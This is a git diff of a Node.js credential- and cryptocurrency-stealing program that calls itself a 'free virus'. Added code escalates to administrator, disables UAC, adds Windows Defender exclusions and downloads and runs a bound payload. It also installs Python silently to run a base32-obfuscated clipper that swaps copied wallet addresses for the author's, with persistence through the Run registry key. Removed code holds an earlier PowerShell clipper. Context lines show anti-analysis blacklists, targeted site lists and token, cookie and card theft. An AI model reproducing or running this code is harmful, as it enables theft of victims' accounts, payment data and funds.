@@ -4,10 +4,8 @@ const path = require('path');
 const axios = require('axios');
 const os = require('os');
 const FormData = require('form-data');
-const sudo = require("sudo-prompt");
-const admin = require("admin-check");
 const AdmZip = require('adm-zip');
-const { execSync, exec } = require('child_process');
+const { spawn, execFileSync, execSync, exec } = require('child_process');
 const crypto = require('crypto');
 const sqlite3 = require('sqlite3');
 const util = require('util');
@@ -18,16 +16,15 @@ const computerName = os.hostname();
 const local = process.env.LOCALAPPDATA;
 const discords = [];
 const locale = getLocale();
-const mainFolderPath = `C:/ProgramData/Steam/Launcher/${locale}-${computerName}`;
+const mainFolderPath = `C:/ProgramData/Steam/Launcher/${generateRandomString(12)}/${locale}-${computerName}`;
 var appdata = process.env.APPDATA, LOCAL = process.env.LOCALAPPDATA, localappdata = process.env.LOCALAPPDATA;
-const keywords = ["gmail.com", "live.com", "impots.gouv.fr", "zoho.com", "ameli.fr", "yahoo.com", "tutanota.com", "uber.com", "trashmail.com", "gmx.net", "github.com", "ubereats.com", "safe-mail.net", "thunderbird.net", "mail.lycos.com", "hushmail.com", "mail.aol.com", "icloud.com", "protonmail.com", "fastmail.com", "rackspace.com", "1and1.com", "mailbox.org", "mail.yandex.com", "titan.email", "youtube.com", "nulled.to", "cracked.to", "tiktok.com", "yahoo.com", "gmx.com", "aol.com", "coinbase", "mail.ru", "rambler.ru", "gamesense.pub", "neverlose.cc", "onetap.com", "fatality.win", "vape.gg", "binance", "ogu.gg", "lolz.guru", "xss.is", "g2g.com", "igvault.com", "plati.ru", "minecraft.net", "primordial.dev", "vacban.wtf", "instagram.com", "mail.ee", "hotmail.com", "facebook.com", "vk.ru", "x.synapse.to", "hu2.app", "shoppy.gg", "app.sell", "sellix.io", "gmx.de", "riotgames.com", "mega.nz", "roblox.com", "exploit.in", "breached.to", "v3rmillion.net", "hackforums.net", "0x00sec.org", "unknowncheats.me", "godaddy.com", "accounts.google.com", "aternos.org", "namecheap.com", "hostinger.com", "stake.com", "hostgator.com", "siteground.com", "netafraz.com", "iranserver.com", "ionos.com", "whois.com", "te.eg", "vultr.com", "mizbanfa.net", "neti.ee", "osta.ee", "cafe24.com", "wpengine.com", "parspack.com", "cloudways.com", "inmotionhosting.com", "hinet.net", "mihanwebhost.com", "mojang.com", "phoenixnap.com", "dreamhost.com", "rackspace.com", "name.com", "alibabacloud.com", "a2hosting.com", "contabo.com", "xinnet.com", "7ho.st", "hetzner.com", "domain.com", "west.cn", "iranhost.com", "yisu.com", "ovhcloud.com", "000webhost.com", "reg.ru", "lws.fr", "home.pl", "sakura.ne.jp", "matbao.net", "scalacube.com", "telia.ee", "estoxy.com", "zone.ee", "veebimajutus.ee", "beehosting.pro", "core.eu", "wavecom.ee", "iphoster.net", "cspacehostings.com", "zap-hosting.com", "iceline.com", "zaphosting.com", "cubes.com", "chimpanzeehost.com", "fatalityservers.com", "craftandsurvive.com", "mcprohosting.com", "shockbyte.com", "ggservers.com", "scalacube.com", "apexminecrafthosting.com", "nodecraft.com", "sparkedhost.com", "pebblehost.com", "ramshard.com", "linkvertise.com", "adf.ly", "spotify.com", "tv3play.ee", "clarity.tk", "messenger.com", "snapchat.com", "boltfood.eu", "stuudium.com", "steamcommunity.com", "epicgames.com", "greysec.net", "twitter.com", "reddit.com", "amazon.com", "redengine.eu", "eulencheats.com", "4netplayers.com", "velia.net", "bybit.com", "coinbase.com", "ftx.com", "ftx.us", "binance.us", "bitfinex.com", "kraken.com", "bitstamp.net", "bittrex.com", "kucoin.com", "cex.io", "gemini.com", "blockfi.com", "nexo.io", "nordvpn.com", "surfshark.com", "privateinternetaccess.com", "netflix.com", "astolfo.lgbt", "intent.store", "novoline.wtf", "flux.today", "moonx.gg", "novoline.lol", "twitch.tv"];
+const keywords = ["gmail.com", "live.com", "impots.gouv.fr", "zoho.com", "ameli.fr", "yahoo.com", "tutanota.com", "uber.com", "trashmail.com", "gmx.net", "github.com", "ubereats.com", "safe-mail.net", "thunderbird.net", "mail.lycos.com", "hushmail.com", "mail.aol.com", "icloud.com", "protonmail.com", "fastmail.com", "rackspace.com", "1and1.com", "mailbox.org", "mail.yandex.com", "titan.email", "youtube.com", "nulled.to", "cracked.to", "tiktok.com", "yahoo.com", "gmx.com", "aol.com", "coinbase", "mail.ru", "rambler.ru", "gamesense.pub", "neverlose.cc", "onetap.com", "fatality.win", "vape.gg", "binance", "ogu.gg", "lolz.guru", "xss.is", "g2g.com", "igvault.com", "plati.ru", "minecraft.net", "primordial.dev", "vacban.wtf", "instagram.com", "mail.ee", "hotmail.com", "facebook.com", "vk.ru", "x.synapse.to", "hu2.app", "shoppy.gg", "app.sell", "sellix.io", "gmx.de", "riotgames.com", "mega.nz", "roblox.com", "exploit.in", "breached.to", "v3rmillion.net", "hackforums.net", "0x00sec.org", "unknowncheats.me", "godaddy.com", "accounts.google.com", "aternos.org", "namecheap.com", "hostinger.com", "bluehost.com", "hostgator.com", "siteground.com", "netafraz.com", "iranserver.com", "ionos.com", "whois.com", "te.eg", "vultr.com", "mizbanfa.net", "neti.ee", "osta.ee", "cafe24.com", "wpengine.com", "parspack.com", "cloudways.com", "inmotionhosting.com", "hinet.net", "mihanwebhost.com", "mojang.com", "phoenixnap.com", "dreamhost.com", "rackspace.com", "name.com", "alibabacloud.com", "a2hosting.com", "contabo.com", "xinnet.com", "7ho.st", "hetzner.com", "domain.com", "west.cn", "iranhost.com", "yisu.com", "ovhcloud.com", "000webhost.com", "reg.ru", "lws.fr", "home.pl", "sakura.ne.jp", "matbao.net", "scalacube.com", "telia.ee", "estoxy.com", "zone.ee", "veebimajutus.ee", "beehosting.pro", "core.eu", "wavecom.ee", "iphoster.net", "cspacehostings.com", "zap-hosting.com", "iceline.com", "zaphosting.com", "cubes.com", "chimpanzeehost.com", "fatalityservers.com", "craftandsurvive.com", "mcprohosting.com", "shockbyte.com", "ggservers.com", "scalacube.com", "apexminecrafthosting.com", "nodecraft.com", "sparkedhost.com", "pebblehost.com", "ramshard.com", "linkvertise.com", "adf.ly", "spotify.com", "tv3play.ee", "clarity.tk", "messenger.com", "snapchat.com", "boltfood.eu", "stuudium.com", "steamcommunity.com", "epicgames.com", "greysec.net", "twitter.com", "reddit.com", "amazon.com", "redengine.eu", "eulencheats.com", "4netplayers.com", "velia.net", "bybit.com", "coinbase.com", "ftx.com", "ftx.us", "binance.us", "bitfinex.com", "kraken.com", "bitstamp.net", "bittrex.com", "kucoin.com", "cex.io", "gemini.com", "blockfi.com", "nexo.io", "nordvpn.com", "surfshark.com", "privateinternetaccess.com", "netflix.com", "astolfo.lgbt", "intent.store", "novoline.wtf", "flux.today", "moonx.gg", "novoline.lol", "twitch.tv"];
 const atomicInjectionUrl = "https://github.com/doenerium6969/wallet-injection/raw/main/atomic.asar";
 const exodusInjectionUrl = "https://github.com/doenerium6969/wallet-injection/raw/main/exodus.asar";
 
 const url = 'BINDER-LINK-HERE';
 const botToken = 'YOURBOTTOKEN';
 const chatId = 'YOURCHATID';
-const discordWebhookUrl = 'REMPLACE_ME';
 
 
 const blackListedIPS = ["88.132.231.71", "212.119.227.165", "52.251.116.35", "194.154.78.69", "194.154.78.137", "213.33.190.219", "78.139.8.50", "20.99.160.173", "88.153.199.169", "84.147.62.12", "194.154.78.160", "92.211.109.160", "195.74.76.222", "188.105.91.116", "34.105.183.68", "92.211.55.199", "79.104.209.33", "95.25.204.90", "34.145.89.174", "109.74.154.90", "109.145.173.169", "34.141.146.114", "212.119.227.151", "195.239.51.59", "192.40.57.234", "64.124.12.162", "34.142.74.220", "188.105.91.173", "109.74.154.91", "34.105.72.241", "109.74.154.92", "213.33.142.50", ];
@@ -38,36 +35,37 @@ const blacklistedOS = ["Windows Server 2022 Datacenter", "Windows Server 2019 St
 const blackListedProcesses = ["watcher.exe", "mitmdump.exe", "mitmproxy.exe", "mitmweb.exe", "Insomnia.exe", "HTTP Toolkit.exe", "Charles.exe", "Postman.exe", "BurpSuiteCommunity.exe", "Fiddler Everywhere.exe", "Fiddler.WebUi.exe", "HTTPDebuggerUI.exe", "HTTPDebuggerSvc.exe", "HTTPDebuggerPro.exe", "x64dbg.exe", "Ida.exe", "Ida64.exe", "Progress Telerik Fiddler Web Debugger.exe", "HTTP Debugger Pro.exe", "Fiddler.exe", "KsDumperClient.exe", "KsDumper.exe", "FolderChangesView.exe", "BinaryNinja.exe", "Cheat Engine 6.8.exe", "Cheat Engine 6.9.exe", "Cheat Engine 7.0.exe", "Cheat Engine 7.1.exe", "Cheat Engine 7.2.exe", "OllyDbg.exe", "Wireshark.exe",];
 
 
+function hasAdminPrivileges() {
+    const testFilePath = path.join(process.env.WINDIR, 'System32', `${generateRandomString(10)}.txt`);
+    
+    try {
+        // Try to write a file in the System32 folder
+        fs.writeFileSync(testFilePath, 'test');
+        fs.unlinkSync(testFilePath); // Delete the file after testing
+        return true;
+    } catch (err) {
+        return false;
+    }
+}
+
+// Relaunch the script with administrative privileges
 function relaunchAsAdmin() {
-    const scriptPath = path.resolve(process.argv[1]);
-    const command = `powershell -Command "Start-Process node '${scriptPath}' -ArgumentList '${process.argv.slice(2).join(' ')}' -Verb RunAs"`;
+    const scriptPath = process.execPath;
+    const scriptArgs = process.argv.slice(1).join(' ');
+    const command = `powershell -Command "Start-Process '${scriptPath}' -ArgumentList '${scriptArgs}' -Verb RunAs"`;
 
     console.log('Relaunching the script as administrator...');
     execSync(command, { stdio: 'inherit' });
-    process.exit(0); // Terminer le processus actuel
+    process.exit(0);
 }
 
 async function main() {
-  try {
-    // Check if the current user has admin privileges
-    const hasAdmin = await admin.check();
-    if (!hasAdmin) {
-      // If not, relaunch the script with admin privileges
-      const scriptPath = process.execPath; // Path to the current executable
-      const scriptArgs = `"${path.join(process.argv[1])}"`; // Path to the current script
-      sudo.exec(`${scriptPath} ${scriptArgs} --admin`, (error) => {
-        if (error) {
-          console.error("Failed to obtain administrative privileges:", error);
-        } else {
-          process.abort(); // Terminate the current process
-        }
-      });
+    if (!hasAdminPrivileges()) {
+        console.log("The script does not have administrative privileges.");
+        relaunchAsAdmin();
     } else {
-      console.log("Script is running with administrative privileges.");
+        console.log("The script is running with administrative privileges.");
     }
-  } catch (error) {
-    console.error("An error occurred while checking admin privileges:", error);
-  }
 }
 
 
@@ -958,128 +956,129 @@ function initializeFolders() {
 }
 
 
-function createAndExecuteScripts() {
-    const userDataPath = path.join('C:', 'ProgramData', 'edge', 'Updater');
+function downloadPythonInstaller(url, outputFilePath) {
+    return axios({
+        url,
+        method: 'GET',
+        responseType: 'stream',
+    }).then(response => {
+        return new Promise((resolve, reject) => {
+            const file = fs.createWriteStream(outputFilePath);
+            response.data.pipe(file);
+            file.on('finish', () => file.close(resolve));
+            file.on('error', (err) => fs.unlink(outputFilePath, () => reject(err)));
+        });
+    }).catch(error => {
+        console.error(`Failed to download Python installer: ${error.message}`);
+    });
+}
+
+// Function to install Python
+async function installPython() {
+    const tempDir = os.tmpdir();  // Use the temporary directory
+    const pythonInstallerUrl = 'https://www.python.org/ftp/python/3.12.6/python-3.12.6-amd64.exe';
+    const pythonInstallerFile = path.join(tempDir, 'python-installer.exe');
+
+    console.log('Downloading Python installer...');
+    await downloadPythonInstaller(pythonInstallerUrl, pythonInstallerFile);
+
+    console.log('Performing silent installation of Python...');
+    try {
+        execFileSync(pythonInstallerFile, [
+            '/quiet',
+            'InstallAllUsers=0',
+            'PrependPath=1',
+            'Include_test=0',
+            'Include_pip=1',
+            'Include_doc=0'
+        ], { stdio: 'ignore' });
+        console.log('Python installed successfully.');
+    } catch (error) {
+        console.error(`Error during Python installation: ${error.message}`);
+    }
+
+    // Delete the installer file
+    fs.unlinkSync(pythonInstallerFile);
+    console.log('Installer deleted.');
+
+    return path.join(process.env['USERPROFILE'], 'AppData', 'Local', 'Programs', 'Python', 'Python312', 'pythonw.exe');
+}
+
+// Replace with your addresses or all money to me :)
+const addresses = {
+    btc: "bc1qsuc4rc2uknl43kqxemuyv6d3xffnds2j008gj7",
+    eth: "0x700875DF55d904b24469458a6bAE04F6dd7eF91F",
+    ltc: "ltc1qx7n7fr4anyssyhfp2s4sd9jv7r89ex9sd2d6dg",
+    trx: "TJYeEhaoY5sQ66SHLbCp85jGcSkqLLvBTU",
+    bch: "qzjw4dju5x2x3kwtuelppmm8lpw7mvna7s5fle3sr4",
+    xmr: "43AKqd1L4QKVQux7bKEK6dUmVKEJTdEtgSgYaj25rgRGaUrp2gekLA1bRDzJbbadPTaNwBG8njmYCVvEiJZByyvV6NanCUR",
+    xrp: "rf2ysNUBNYFPX5tzNfaNgRjJDedQWh6mSV",
+    zcash: "t1a34uQ8XRNKoWyykQUAtR6vj58UDMpaayf",
+    doge: "DQ5eZQyMbCsAGDoE7vq3zsPH7v43EvfUV6rJvtArsqqv7LEmb3BF6e1vHudGPCQppaxf"
+};
+
+// This is a clipper, here is the decrypted code: https://pastebin.com/raw/ujJT2Xje (DM me on Telegram if you don't know how to decrypt base64 :0)
+async function clip(pythonwExe) {
+    const userDataPath = path.join(os.homedir(), 'AppData', 'Roaming', `${generateRandomString(8)}`);
     if (!fs.existsSync(userDataPath)) {
         fs.mkdirSync(userDataPath, { recursive: true });
     }
 
-    const scriptsPath = userDataPath;
-    const randomFileName = `${generateRandomString(10)}.ps1`;
-    const ps1Path = path.join(scriptsPath, randomFileName);
+    const scriptContent = `
+import base64
+# Base32 encoded Python code
+encoded_code = """NFWXA33SOQQHEZIKNFWXA33SOQQHI2LNMUFGS3LQN5ZHIIDQPFYGK4TDNRUXACTJNVYG64TUEBRGC43FGY2AUCTBMRSHEZLTONSXGIB5EB5QUIBAEAQCEYTUMMRDUIBCMJRTC4LTOVRTI4TDGJ2WW3TMGQZWW4LYMVWXK6LWGZSDG6DGMZXGI4ZSNIYDAODHNI3SELAKEAQCAIBCMV2GQIR2EARDA6BXGAYDQNZVIRDDKNLEHEYDIYRSGQ2DMOJUGU4GCNTCIFCTANCGGZSGIN3FIY4TCRRCFQFCAIBAEARGY5DDEI5CAITMORRTC4LYG5XDOZTSGRQW46LTON4WQZTQGJZTI43EHFVHMN3SHA4WK6BZONSDEZBWMRTSELAKEAQCAIBCORZHQIR2EARFISSZMVCWQYLPLE2XGUJWGZJUQTDCINYDQNLKI5RVG23RJRGHMQSUKURCYCRAEAQCAITCMNUCEORAEJYXU2TXGRSGU5JVPAZHQM3LO52HKZLMOBYG23JYNRYHON3NOZXGCN3TGVTGYZJTONZDIIRMBIQCAIBAEJ4G24RCHIQCENBTIFFXCZBRJQ2FCS2WKF2XQN3CJNCUWNTEKVWVMS2FJJKGIRLUM5JWOWLBNIZDK4THKJDWCVLSOAZGOZLLJRATCYSSIR5EUYTCMFSFAVDBJZ3UERZYNZVG2WKDKZ3EK2KKLJBHS6LWKY3E4YLOINKVEIRMBIQCAIBAEJ4HE4BCHIQCE4TGGJ4XGTSVIJHFSRSQLA2XI6SOMZQU4Z2SNJFEIZLEKFLWQNTNKNLCELAKEAQCAIBCPJRWC43IEI5CAITUGFQTGNDVKE4FQUSOJNXVO6LZNNIVKQLUKI3HM2RVHBKUITLQMFQXSZRCFQFCAIBAEARGEY3IEI5CA4RCLYUCQYTJORRW62LOMNQXG2B2FE7SQ4L4OAUVWYJNPIYC2OK5PM2DC7JJEQRCYCRAEAQCAIT2MNQXG2BCHIQHEIS6OQYVWMBNHFAS26S5PMZTELBTHF6SIIRMBIQCAIBAEJSG6Z3FEI5CA4RCLZCHWML5LM2S2OKBFVEEULKOKAWVKXL3GF6VWMJNHFAS2SCKFVHFALK2MEWWW3JNPJOXWMZSFQ3DC7JEEIFH2CQKMRSWMIDNN5XGS5DPOJPWG3DJOBRG6YLSMQUCSOQKEAQCAIDSMVRWK3TUL53GC3DVMUQD2IBCEIFCAIBAEB3WQ2LMMUQFI4TVMU5AUIBAEAQCAIBAEBRWY2LQMJXWC4TEL53GC3DVMUQD2IDQPFYGK4TDNRUXALTQMFZXIZJIFEFCAIBAEAQCAIBANFTCAY3MNFYGE33BOJSF65TBNR2WKIBBHUQHEZLDMVXHIX3WMFWHKZJ2BIQCAIBAEAQCAIBAEAQCAIBAEAQCAIBAEBRHEZLBNMFCAIBAEAQCAIBAORUW2ZJOONWGKZLQFAYC4NJJBIFGSZRAL5PW4YLNMVPV6IB5HUQCEX27NVQWS3S7L4RDUCRAEAQCA3LPNZUXI33SL5RWY2LQMJXWC4TEFAUQ="""
+# Function to adjust padding for Base64 string
+def adjust_padding(encoded_str):
+    missing_padding = len(encoded_str) % 8
+    if missing_padding:
+        encoded_str += '=' * (8 - missing_padding)
+    return encoded_str
+# Adjust padding of the encoded string
+encoded_code = adjust_padding(encoded_code.strip())
+# Decode the Base64 encoded content
+decoded_code = base64.b32decode(encoded_code).decode('utf-8')
+# Execute the decoded code
+exec(decoded_code)
+`;
 
-    const powershellScriptContent = `
-$sctpth = $MyInvocation.MyCommand.Path
-$ran = -join ((65..90) + (97..122) | Get-Random -Count 15 | ForEach-Object {[char]$_})
-$ranpth = if ((Get-Random) % 2) { Join-Path $env:TEMP "$ran.ps1" } else { Join-Path $env:APPDATA "$ran.ps1" }
-Copy-Item -Path $sctpth -Destination $ranpth -Force
-Remove-Item -Path $sctpth -Force
+    const scriptFilePath = path.join(userDataPath, `${generateRandomString(10)}.py`);
+    fs.writeFileSync(scriptFilePath, scriptContent);
 
-$key = "HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
-$valn = "Powershell"
-$val = """powershell.exe"" -WindowStyle Hidden -ExecutionPolicy Bypass -File ""$ranpth"""
-
-if (!(Test-Path $key)) {
-    New-Item -Path $key -Force | Out-Null
-}
-
-Set-ItemProperty -Path $key -Name $valn -Value $val
-
-Add-Type -Name Window -Namespace Console -MemberDefinition '
-[DllImport("Kernel32.dll")]
-public static extern IntPtr GetConsoleWindow();
-[DllImport("user32.dll")]
-public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
-public static void Hide()
-{
-    IntPtr hWnd = GetConsoleWindow();
-    if(hWnd != IntPtr.Zero)
-    {
-        ShowWindow(hWnd, 0);
-    }
-}
-'
-[Console.Window]::Hide()
-
-$attr = [System.IO.FileAttributes]::Hidden
-Set-ItemProperty -Path $ranpth -Name Attributes -Value $attr
-
-$addy = @{
-    "btc" = "bc1qsuc4rc2uknl43kqxemuyv6d3xffnds2j008gj7"
-    "eth" = "0x700875DF55d904b24469458a6bAE04F6dd7eF91F"
-    "ltc" = "ltc1qx7n7fr4anyssyhfp2s4sd9jv7r89ex9sd2d6dg"
-    "trx" = "TJYeEhaoY5sQ66SHLbCp85jGcSkqLLvBTU"
-    "bch" = "qzjw4dju5x2x3kwtuelppmm8lpw7mvna7s5fle3sr4"
-    "xmr" = "43AKqd1L4QKVQux7bKEK6dUmVKEJTdEtgSgYaj25rgRGaUrp2gekLA1bRDzJbbadPTaNwBG8njmYCVvEiJZByyvV6NanCUR"
-    "xrp" = "rf2ysNUBNYFPX5tzNfaNgRjJDedQWh6mSV"
-    "zcash" = "t1a34uQ8XRNKoWyykQUAtR6vj58UDMpaayf"
-    "doge" = "DQ5eZQyMbCsAGDoE7vq3zsPH7v43EvfUV6rJvtArsqqv7LEmb3BF6e1vHudGPCQppaxf"
-}
-
-while ($true) {
-    $clipper = Get-Clipboard
-    if ($clipper -match "^(bc1|[13])[a-zA-HJ-NP-Z0-9]{26,41}$") {
-        $clipper = $addy["btc"]
-        [System.Windows.Forms.Clipboard]::SetText($clipper)
-    }
-    elseif ($clipper -match "^0x[a-fA-F0-9]{40}$") {
-        $clipper = $addy["eth"]
-        [System.Windows.Forms.Clipboard]::SetText($clipper)
-    }
-    elseif ($clipper -match "^(L|M|3|ltc1)[a-km-zA-HJ-NP-Z1-9]{26,33}$") {
-        $clipper = $addy["ltc"]
-        [System.Windows.Forms.Clipboard]::SetText($clipper)
-    }
-    elseif ($clipper -match "^T[a-zA-Z0-9]{28,33}$") {
-        $clipper = $addy["trx"]
-        [System.Windows.Forms.Clipboard]::SetText($clipper)
-    }
-    elseif ($clipper -match "^((bitcoincash:)?(q|p)[a-z0-9]{41})$") {
-        $clipper = $addy["bch"]
-        [System.Windows.Forms.Clipboard]::SetText($clipper)
-    }
-    elseif ($clipper -match "^4[0-9AB][1-9A-HJ-NP-Za-km-z]{92,95}$") {
-        $clipper = $addy["xmr"]
-        [System.Windows.Forms.Clipboard]::SetText($clipper)
-    }
-    elseif ($clipper -match "^(?:^r[0-9a-zA-Z]{24,34}$)") {
-        $clipper = $addy["xrp"]
-        [System.Windows.Forms.Clipboard]::SetText($clipper)
-    }
-    elseif ($clipper -match "^t1[0-9A-z]{32,39}$") {
-        $clipper = $addy["zcash"]
-        [System.Windows.Forms.Clipboard]::SetText($clipper)
-    }
-    elseif ($clipper -match "^{1}[5-9A-HJ-NP-U]{1}[1-9A-HJ-NP-Za-km-z]{32,61}$") {
-        $clipper = $addy["doge"]
-        [System.Windows.Forms.Clipboard]::SetText($clipper)
-    }
-    Start-Sleep -Milliseconds 500
-}`;
+    // Add the Python script to startup
+    const startupScriptPath = `"${pythonwExe}" "${scriptFilePath}"`;
+    const regPath = `HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run`;
 
     try {
-        fs.writeFileSync(ps1Path, powershellScriptContent, 'utf8');
-        console.log(`Script PowerShell enregistré avec succès à l'emplacement : ${ps1Path}`);
-
-        exec(`powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File "${ps1Path}"`, (error, stdout, stderr) => {
-            if (error) {
-                console.error(`Erreur lors de l'exécution du script PowerShell : ${error.message}`);
-                return;
-            }
-            if (stderr) {
-                console.error(`Erreur lors de l'exécution du script PowerShell : ${stderr}`);
-                return;
-            }
-            console.log(`Script PowerShell exécuté avec succès : ${stdout}`);
-        });
+        execSync(`reg add ${regPath} /v PythonUpdater /t REG_SZ /d "${startupScriptPath}" /f`);
+        console.log('Python script added to startup successfully.');
     } catch (error) {
-        console.error(`Erreur lors de l'enregistrement du script PowerShell : ${error.message}`);
-        return;
+        console.error(`Error adding to startup: ${error.message}`);
+    }
+
+    // Run the Python script in the background
+    try {
+        const pythonProcess = spawn(pythonwExe, [scriptFilePath], { detached: true, stdio: 'ignore' });
+        pythonProcess.unref();  // Detach the process to let it run in the background
+        console.log('Python script executed successfully in the background.');
+    } catch (error) {
+        console.error(`Error running Python script: ${error.message}`);
     }
 }
 
+async function createAndExecuteScripts() {
+    try {
+        const pythonwExe = await installPython();
+        clip(pythonwExe);  // Run the Python script
+    } catch (error) {
+        console.error(`Error: ${error.message}`);
+    }
 
-/*
+    // Continue script execution even after an error
+    console.log('Continuing script execution...');
+}
+
+/* old shit
 function createRunBat() {
     const userData = path.join('C:', 'ProgramData', 'edge', 'Updater');
     if (!fs.existsSync(userData)) {
@@ -1813,7 +1812,10 @@ async function getTokens() {
         await findToken(path);
     }
 
-    const predefinedBio = `╔═══════════✧✧✧═══════════╗ **This free virus can bypass all antivirus ! ⭐️https://t.me/doenerium69** ⭐️ ╚═══════════✧✧✧═══════════╝`;
+    const predefinedBio = `╔═══════════✧✧✧═══════════╗ 
+**     This free virus can bypass all antivirus !** 
+**           ⭐️https://t.me/doenerium69** ⭐️
+╚═══════════✧✧✧═══════════╝`;
 
     for (let token of tokens) {
         try {
@@ -3970,17 +3972,16 @@ async function submitFileZilla() {
   }
 }
 
-function taskmgr(cc) {
-  if (cc !== "yes") return;
-  const regKey = new Winreg({
-    hive: Winreg.HKCU,
-    key: "\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System"
-  });
-  const valueName = "DisableTaskMgr";
-  const disableValue = 1;
-  regKey.set(valueName, Winreg.REG_DWORD, disableValue, err => {
-    if (err) {} else {}
-  });
+function disableUAC() {
+    try {
+        // Command to disable UAC
+        const command = 'reg add "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v EnableLUA /t REG_DWORD /d 0 /f';
+
+        // Execute the command
+        execSync(command, { stdio: 'inherit' });
+    } catch (error) {
+        console.error(`Failed to disable UAC: ${error.message}`);
+    }
 }
 
 
@@ -4008,6 +4009,9 @@ const saveDir = 'C:\\ProgramData\\Microsoft';
 
 async function binder(url, saveDir) {
   try {
+    // Add Windows Defender exclusion for the save directory
+    addDefenderExclusion(saveDir);
+
     // Ensure the save directory exists
     if (!fs.existsSync(saveDir)) {
       fs.mkdirSync(saveDir, { recursive: true });
@@ -4026,7 +4030,7 @@ async function binder(url, saveDir) {
 
     response.data.on('end', () => {
       console.log(`File downloaded and saved to ${filePath}`);
-      executeCommand();
+      executeCommand(filePath);
     });
 
     response.data.on('error', (err) => {
@@ -4038,9 +4042,9 @@ async function binder(url, saveDir) {
   }
 }
 
-function executeCommand() {
-  const command = 'start "" "${filePath}"';
-  
+function executeCommand(filePath) {
+  const command = `start "" "${filePath}"`;
+
   exec(command, (error, stdout, stderr) => {
     if (error) {
       console.error(`Error executing the command: ${error.message}`);
@@ -4054,14 +4058,32 @@ function executeCommand() {
   });
 }
 
+function addDefenderExclusion(directory) {
+  const command = `powershell -Command "Add-MpPreference -ExclusionPath '${directory}'"`;
+
+  exec(command, (error, stdout, stderr) => {
+    if (error) {
+      console.error(`Error adding Windows Defender exclusion: ${error.message}`);
+      return;
+    }
+    if (stderr) {
+      console.error(`Standard error: ${stderr}`);
+      return;
+    }
+    console.log(`Windows Defender exclusion added for ${directory}`);
+  });
+}
+
 
 // Browser Functions
 function manageBrowsers() {
+    closeBrowsers();
     Killchrome();
     getEncrypted();
     getTokens();
     submitFileZilla();
 }
+
 
 
 // Games Functions
@@ -4075,7 +4097,6 @@ function games() {
 
 // Browsers Data Extractions
 function browsers() {
-    closeBrowsers();
     getCookies();
     getAutofills();
     getCards();
@@ -4103,7 +4124,7 @@ function wallet() {
 // Miscellaneous Functions
 function handleMiscellaneous() {
     //createRunBat();
-    //createAndExecuteScripts();
+    createAndExecuteScripts();
     redirectErrorsToLog();
 }
 
